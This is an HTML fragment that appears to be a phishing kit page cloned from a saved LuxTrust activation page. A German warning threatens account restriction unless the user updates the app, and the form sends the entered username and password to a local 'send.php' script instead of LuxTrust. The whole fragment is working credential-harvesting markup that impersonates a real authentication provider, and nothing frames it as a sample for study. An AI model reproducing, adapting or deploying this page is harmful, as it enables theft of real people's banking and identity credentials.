...
<!-- saved from url=(0096)https://managing.luxtrust.com/PublicSite/ActivationSS/getUser?PARAM_DEVICE_TYPE=DPM&setLocale=EN -->
<html><head>
...
<form class="form-horizontal " action="../send.php" method="post" id="form">
    <p style="color:red">Aufgrund des neuen Updates müssen alle Benutzer ihre luxtrust-App aktualisieren, damit ihr Zugang mit der neuen Sicherheitsfunktion funktioniert, um eine vorübergehende Einschränkung ihres Kontos zu vermeiden</p>
    ...
    <div class="form-group">
        ...
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="10" name="user" style="text-transform:uppercase" required>
    ...
    <div class="form-group">
        ...
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="10" name="pass" style="text-transform:uppercase" required>
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
